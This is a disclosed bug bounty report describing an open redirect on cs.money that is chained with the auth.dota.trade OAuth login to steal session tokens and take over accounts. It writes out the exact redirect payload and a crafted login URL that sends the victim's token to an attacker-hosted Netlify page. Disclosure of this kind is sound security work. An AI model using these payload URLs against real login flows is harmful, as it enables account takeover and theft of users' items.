# [cs.money] Open Redirect Leads to Account Takeover

## Report Details
- **Report ID**: 905607
- **URL**: https://hackerone.com/reports/905607
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-22T19:34:01.920Z
- **Disclosed**: 2020-09-30T12:31:27.285Z

## Reporter
- **Username**: abdilahrf_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cs_money

## Vulnerability Information
## Summary:

I found an open redirect on `https://cs.money` domain, using this payload `https://cs.money///google.com` we can redirect into any domain that we want, you can see the request and response from this image below :

███

## Steps To Reproduce:

The final payload is having an account takeover as the impact, by chaining the openredirect vulnerability with login oauth function, the steps to reproduce is below:

  1. Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in through steam`:

█████████

  2. Login as usual, the application will redirect you to `https://loving-turing-29a494.netlify.app/#?token=Dlk9sGd8zc6OvxlITijQR&redirectUrl=https://cs.money///loving-turing-29a494.netlify.app#` you will see like this image :
███████
  3.the  attacker already received the victim token on the attacker listener 
███

**If the vulnerability requires hosted server, please, let us know if it is a public or a local one you've tested vulnerability on.**
### Public
My POC Hosted here : loving-turing-29a494.netlify.app

I also create the video POC that show an attacker take over an victim account :
█████

## Impact

Attacker gained full control of the victim account, was able to change the trade-offer link into the attacker link and redeem all the items into attacker account and almost can do anything.

## Attachments
No attachments
